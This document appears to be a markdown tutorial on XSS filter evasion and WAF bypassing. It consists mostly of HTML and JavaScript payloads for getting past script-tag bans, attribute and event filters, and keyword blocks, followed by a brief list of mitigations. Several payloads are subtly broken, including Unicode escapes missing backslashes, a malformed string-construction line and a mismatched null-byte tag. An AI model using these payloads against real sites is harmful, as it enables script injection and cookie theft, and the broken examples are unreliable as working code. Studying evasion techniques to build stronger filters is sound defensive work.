# XSS Filter Evasion and WAF Bypassing 

  - Bypassing Blacklisting Filters
  - Bypassing Sanitization
  - Bypassing Browser Filters

## 1. Bypassing Blacklisting Filters

> Blacklisting filters are a common security measure, but they can often be bypassed with clever techniques.

### 1.A : Bypassing <script> Tag Banning

> The <script> tag is the primary method which can be used to execute client side scripting code such as JavaScript.
It was designed for this purpose, and of course, this is the first vector that most filters block.


While blocking the `<script>` tag is a common strategy, there are multiple ways to circumvent it:

-   **Filter expretion code:**
    
    PHP
    ``` 
    $str = "<script>alert(1)</script>" ; 
    $str = preg_replace('/<\w+>|<\/\w+>/' , " " , $str) ; 
    echo($str); // alert(1) so not work 
    
    ```
   **Bypassing Weak <script> Tag Banning**
-   **Case Sensitivity:**
    
    HTML
    
    ```
    <ScRiPt>alert(1);</ScRiPt>
    
    ```
    
-   **Missing Closing Tag:**
    
    HTML
    
    ```
    <ScRiPt>alert(1);
    
    ```
    
    
-   **Random String After Tag Name:**
    
    HTML
    
    ```
    <script/anytext>alert(1);</script>
    
    ```
    
    
-   **Newline After Tag Name:**
    
    HTML
    
    ```
    <script
    >alert(1);</script>
    
    ```
    
    
-   **Nested Tags:**
    
    HTML
    
    ```
    <scr<script>ipt>alert(1) </scr<script>ipt>
    
    ```
    
    
-   **NULL Byte (IE up to v9):**
    
    HTML
    
    ```
    <scr\x00ipt> alert(1) </scr/x00ipt>
    
    ```
    

    
---

### 1.B : Bypassing Using HTML Attributes And Events

Many HTML attributes can be exploited to execute JavaScript:

-   **Inline JavaScript in `href` Attribute:**
    
    HTML
    
    ```
    <a href="javascript: alert(1)">show</a>
    ```

    -   This directly executes JavaScript code when the link is clicked.
    -   An attacker could inject malicious JavaScript, like `javascript:alert(document.cookie)` to steal sensitive information.
    
    
-   **Data URI with Embedded Script:**
    
    HTML
    
    ```
    <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>
    
    ```
    
    -   The `data:` URI scheme allows embedding data directly into the URL.
    -   In this case, a base64-encoded script is embedded, which will execute when the link is clicked
    
    
-   **Inline JavaScript in `action` Attribute:**
    
    HTML
    
    ```
    <form action="javascript: alert(1)"><button>send</button></form>
    
    ```
    
    -   This directly executes JavaScript code when the form is submitted.
-   **`formaction` Attribute with JavaScript:**
    
    HTML
    
    ```
    <form id=x></form><button form="x" formaction ="javascript:alert(1)">send</button>
    
    ```
   
    -   The `formaction` attribute specifies the action to be taken when the form is submitted.
    -   Using `javascript:` here allows direct JavaScript execution.
-   **`object` Tag with JavaScript in `data` Attribute:**
    
    HTML
    
    ```
    <object data="javascript: alert(1)">
    
    ```
   
    -   The `object` tag can be used to embed various types of content.
    -   By setting the `data` attribute to a JavaScript expression, it can be executed.
    
    
-   **Data URI with Embedded Script in `object` Tag:**
    
    HTML
    
    ```
    <object data="data:text/html,<script>alert(1)</script>">
    
    ```
   
    -   Similar to the previous example, this embeds a script within a data URI.
-   **Base64-Encoded Data URI with Embedded Script in `object` Tag:**
    
    HTML
    
    ```
    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
    
    ```
    
    -   This is a more complex version of the previous example, using base64 encoding.

-   **Event Handlers:**
    > Many HTML elements support event handler attributes that can execute JavaScript when certain events occur. Common attributes include:

       - onclick
       - onmouseover
       - onerror
       - onload
    
    HTML
    
    ```
    <img src="invalid.jpg" onerror="alert('XSS Attack!')">
    
    ```
    
    
-   **Global Attributes:**
    
    HTML
    
    ```
    <div style="background-image: url(javascript:alert('XSS'));">Hover me!</div>
    
    ```
    
    
-   **Form Attributes:**
    
    HTML
    
    ```
    <form action="javascript:alert('XSS')">
        <input type="submit" value="Submit">
    </form>
    
    ```
    
    
-   **URL Attributes:**
    
    HTML
    
    ```
    <a href="javascript:alert('XSS')">Click me!</a>
    
    ```
    
    
-   **SVG and MathML:**
    
    HTML
    
    ```
    <svg onload="alert('XSS')"></svg>
    
    ```

---

### Bypassing Keyword-Based Filters
> Other obstacles that a signature based filter may introduce are focused on preventing the executing of scripting code by blocking the use of certain keywords, for example: alert , javascript , eval , Let’s now look at some "alternatives" you may use to bypass these types of filters. 

- **Keyword-based filters can be bypassed using various techniques:**

- Filtering PHP code .      
 
    php
    ``` 
         $str = "<script>alert(1)</script>" ; 
         $str = preg_match_all('/alert/i' , $str , $array)  ;
    ```

-   **Unicode Escaping:**
    
    JavaScript
    
    ```
    <script>u0061lert(1)</script>
    <script> u0061 u006C u0065 u0072 u0074 (1)</script>
    
    ```
    
    
-   **Native Unicode Functions:**
    
    JavaScript
    
    ```
    <script>eval("\u0061lert(1)")</script>
    <script>eval("\u0061u0061\u006Cu006C\u0065u0065\u0072u0072\u0074u0074\u0028u0028\u0031u0031\u0029u0029")</script>
    
    ```
    - in summary :
    > You can try: `Unicode` , `Decimal`, `Octal, Hexadecimal`
    

### String Construction

Knowing how to construct strings is an important skill in bypassing filters.
For example, as usual, the alert keyword is blocked, but most likely "ale"+" is not detected. Let’s see some


By constructing strings in creative ways, attackers can bypass filters that look for specific keywords:

JavaScript

```
<script>alert("a"+"l"+"e"+"r"+"t"(1))</script>
String.fromCharCode(97,108,101,114,116)
atob("YWxlcnQ=")
17795081..toString(36)

```


**Mitigation Strategies**

To protect against XSS vulnerabilities, consider the following:

-   **Input Sanitization:** Always sanitize user input to remove or encode harmful characters.
-   **Output Encoding:** Encode output to prevent malicious code execution.
-   **Content Security Policy (CSP):** Implement CSP to restrict the sources of scripts.
-   **Web Application Firewalls (WAFs):** Use WAFs to filter and block malicious traffic.
-   **Regular Security Audits:** Conduct regular security assessments to identify and address vulnerabilities.

By understanding these techniques, you can better protect your web applications from XSS attacks.